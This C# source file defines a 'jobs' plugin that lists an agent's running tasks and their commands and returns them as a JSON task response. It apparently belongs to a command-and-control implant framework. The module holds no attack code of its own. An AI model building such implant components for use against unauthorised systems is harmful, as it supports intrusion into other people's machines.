using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "jobs";
        private IDataBroker messageManager { get; set; }

        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            Dictionary<string, ServerJob> jobs = messageManager.GetJobs();
            Dictionary<string, string> jobsOut = jobs.ToDictionary(j => j.Value.task.id, j => j.Value.task.command);

            messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = JsonSerializer.Serialize(jobsOut),
                completed = true
            });
        }
    }
}
